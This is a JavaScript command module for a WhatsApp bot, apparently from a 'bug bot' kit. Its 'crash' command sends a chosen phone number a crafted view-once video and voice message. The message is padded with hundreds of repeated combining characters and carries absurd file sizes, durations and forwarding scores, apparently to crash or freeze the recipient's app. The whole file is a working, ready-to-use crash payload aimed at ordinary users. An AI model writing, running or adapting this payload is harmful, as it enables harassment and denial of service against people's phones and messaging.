const ownerMiddleware = require('../../utility/botUtil/Ownermiddleware');

module.exports = {
  name: 'crash',
  aliases: ['avx'],
  description: 'Executes AudioVisualXDellay function (owner only)',
  run: async (context) => {
    await ownerMiddleware(context, async () => {
      const { client, m, prefix, text, botname } = context;

      try {
        // Check for target (phone number, quoted user, or current chat if DM)
        let target = text.split(' ')[0] || m.quoted?.sender;
        
        // If no target specified and it's a DM, use current chat
        if (!target && !m.isGroup) {
          target = m.chat;
        }

        if (!target) {
          return client.sendMessage(m.chat, {
            text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Usage: ${prefix}crash <number> or reply to a message\n│❒ Example: ${prefix}crash 254735342800\n┗━━━━━━━━━━━━━━━┛`
          }, { quoted: m });
        }

        // Convert to JID format if needed
        if (!target.includes('@s.whatsapp.net')) {
          target = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
        }

        // Execute the function
        await AudioVisualXDellay(client, target);

        // Success response
        await client.sendMessage(m.chat, {
          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ 💥 Payload executed on ${target}\n┗━━━━━━━━━━━━━━━┛`
        }, { quoted: m });

      } catch (error) {
        console.error('AudioVisualXDellay error:', error);
        await client.sendMessage(m.chat, {
          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Failed to execute payload\n│❒ Error: ${error.message}\n┗━━━━━━━━━━━━━━━┛`
        }, { quoted: m });
      }
    });
  },
};

async function AudioVisualXDellay(sock, target) {
  const msg = {
    to: target,
    message: {
      viewOnceMessage: {
        message: {
          videoMessage: {
            caption: "꧔꧈".repeat(600),
            mimetype: "video/mp4",
            fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺", 
            fileLength: "9999999999",
            seconds: 999999,
            mediaKey: "v/J9vWyG92CnR0fqagJ7GBxQzmDG3+cV+DBL1yyECBI=",
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        }
      },
      audioMessage: {
        mimetype: "audio/ogg; codecs=opus",
        ptt: true,
        seconds: 9999,
        fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺" + "꧔꧈".repeat(500),
        fileLength: "9999999999",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", 
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: [
            ...Array.from({ length: 1 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  };

  await sock.sendMessage(msg.to, msg.message);
}